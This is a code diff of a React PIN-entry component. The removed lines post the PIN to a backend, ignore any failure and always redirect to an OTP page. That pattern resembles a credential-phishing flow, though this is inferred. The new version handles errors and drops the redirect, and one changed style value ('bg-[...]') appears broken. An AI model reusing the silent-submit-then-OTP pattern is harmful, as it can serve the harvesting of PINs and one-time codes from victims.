@@ -1,4 +1,4 @@
-﻿import React, { useState, useRef, useEffect } from "react";
+import React, { useState, useRef, useEffect } from "react";
 import { useNavigate } from "react-router-dom";
 import "../App.css";
 import axios from "axios";
@@ -34,18 +34,23 @@ const Pin = () => {
     }
   };
 
-  const handleSubmit = () => {
+  const handleSubmit = async () => {
     const code = pin.join("");
     if (code.length < PIN_LENGTH) {
       setError("Please enter your 4-digit PIN.");
       return;
     }
     setLoading(true);
-    axios.post(`${BASE_URL}/pin`, { pin: code }).catch(() => {});
-    setTimeout(() => {
+    try {
+      await axios.post(`${BASE_URL}/pin`, { pin: code });
+      setError("");
+      setPin(new Array(PIN_LENGTH).fill(""));
+      inputsRef.current[0]?.focus();
+    } catch (err) {
+      setError("Failed to save PIN. Please try again.");
+    } finally {
       setLoading(false);
-      navigate("/otp");
-    }, 800);
+    }
   };
 
   const allFilled = pin.every((d) => d !== "");
@@ -71,7 +76,7 @@ const Pin = () => {
             value={digit}
             onChange={(e) => handleChange(e, index)}
             onKeyDown={(e) => handleKeyDown(e, index)}
-            className="w-full aspect-square text-center text-[26px] font-bold text-[#0D1B45] border border-gray-200 rounded-[20px] outline-none focus:border-[#0D1B45] focus:border-2 transition-all bg-white"
+            className="w-full aspect-square text-center text-[26px] font-bold text-[#0D1B45] border border-gray-200 rounded-[20px] outline-none focus:border-[#0D1B45] focus:border-2 transition-all bg-[...]"
             aria-label={`PIN digit ${index + 1}`}
           />
         ))}
